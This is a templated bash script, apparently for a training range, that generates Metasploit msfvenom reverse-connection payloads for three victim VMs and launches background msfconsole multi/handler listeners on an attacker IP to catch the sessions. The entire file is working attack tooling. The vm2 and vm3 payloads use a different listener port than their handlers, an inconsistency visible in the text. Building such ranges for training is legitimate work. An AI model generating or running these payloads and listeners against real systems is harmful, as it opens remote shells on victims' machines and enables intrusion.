#!/bin/bash

msfvenom --payload {{ victim['vm1']['payload'] }} --platform {{ victim['vm1']['platform'] }} --arch {{ victim['vm1']['arch'] }} LHOST={{ attacker['ip'] }} LPORT={{ attacker['listener_port']['msf']['rtcp'] }} -f {{ victim['vm1']['beacon_format'] }} > {{ range_root }}/{{ victim['vm1']['beacon_file'] }}

mkdir -p {{ range_root }}
vm1script={{ range_root }}/handler_vm1.rc
cat << EOF > $vm1script
use exploit/multi/handler
set PAYLOAD {{ victim['vm1']['payload'] }}
set LHOST {{ attacker['ip'] }}
set LPORT {{ attacker['listener_port']['msf']['rtcp'] }}
exploit
EOF

nohup msfconsole -r $vm1script &> {{ log_path }}/vm1.log &

msfvenom --payload {{ victim['vm2']['payload'] }} --platform {{ victim['vm2']['platform'] }} --arch {{ victim['vm2']['arch'] }} LHOST={{ attacker['ip'] }} LPORT={{ attacker['listener_port']['msf']['rtcp'] }} -f {{ victim['vm2']['beacon_format'] }} > {{ range_root }}/{{ victim['vm2']['beacon_file'] }}

vm2script={{ range_root }}/handler_vm2.rc
cat << EOF > $vm2script
use exploit/multi/handler
set PAYLOAD {{ victim['vm2']['payload'] }}
set LHOST {{ attacker['ip'] }}
set LPORT {{ attacker['listener_port']['msf']['rhttp'] }}
exploit
EOF

nohup msfconsole -r $vm2script &> {{ log_path }}/vm2.log &

msfvenom --payload {{ victim['vm3']['payload'] }} --platform {{ victim['vm3']['platform'] }} --arch {{ victim['vm3']['arch'] }} LHOST={{ attacker['ip'] }} LPORT={{ attacker['listener_port']['msf']['rtcp'] }} -f {{ victim['vm3']['beacon_format'] }} > {{ range_root }}/{{ victim['vm3']['beacon_file'] }}

vm3script={{ range_root }}/handler_vm3.rc
cat << EOF > $vm3script
use exploit/multi/handler
set PAYLOAD {{ victim['vm3']['payload'] }}
set LHOST {{ attacker['ip'] }}
set LPORT {{ attacker['listener_port']['msf']['rhttp'] }}
exploit
EOF

nohup msfconsole -r $vm3script &> {{ log_path }}/vm3.log &

